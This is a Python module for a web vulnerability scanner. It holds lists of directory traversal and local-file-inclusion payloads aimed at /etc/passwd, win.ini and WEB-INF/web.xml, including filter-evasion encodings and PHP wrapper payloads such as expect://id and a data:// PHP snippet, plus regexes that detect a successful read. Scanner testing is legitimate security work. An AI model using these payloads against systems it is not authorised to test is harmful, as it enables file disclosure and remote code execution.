"""
Directory traversal and LFI payloads ported from AWVS10 classDirectoryTraversal.inc
"""
import re

UNIX_TRAVERSAL = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "..%2fetc%2fpasswd",
    "..%252fetc%252fpasswd",
    "%2e%2e/etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..%00/etc/passwd",
    "..%0d/etc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
]

WINDOWS_TRAVERSAL = [
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5cwindows%5cwin.ini",
    "..%255cwindows%255cwin.ini",
    "....\\\\....\\\\windows\\win.ini",
    "c:\\windows\\win.ini",
    "file:///c:/windows/win.ini",
    "..\\boot.ini",
    "..\\..\\boot.ini",
]

PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=../config",
    "php://filter/convert.base64-encode/resource=../../config",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
]

JAVA_TRAVERSAL = [
    "WEB-INF/web.xml",
    "../WEB-INF/web.xml",
    "../../WEB-INF/web.xml",
    "../../../WEB-INF/web.xml",
]

UNIX_PASSWD_PATTERN = re.compile(r"root:[x*]:0:0:")
WINDOWS_INI_PATTERN = re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.IGNORECASE)
WEBXML_PATTERN = re.compile(r"<web-app|<servlet|<servlet-mapping", re.IGNORECASE)

PHP_INCLUDE_ERRORS = [
    "Failed opening required",
    "failed to open stream",
    "Warning: include",
    "Warning: require",
    "Warning: file_get_contents",
    "No such file or directory",
]


def detect_traversal_success(response_body: str) -> tuple[bool, str]:
    if UNIX_PASSWD_PATTERN.search(response_body):
        return True, "Unix /etc/passwd content detected"
    if WINDOWS_INI_PATTERN.search(response_body):
        return True, "Windows win.ini content detected"
    if WEBXML_PATTERN.search(response_body):
        return True, "Java WEB-INF/web.xml content detected"
    return False, ""


def detect_include_error(response_body: str) -> tuple[bool, str]:
    for err in PHP_INCLUDE_ERRORS:
        if err.lower() in response_body.lower():
            return True, err
    return False, ""
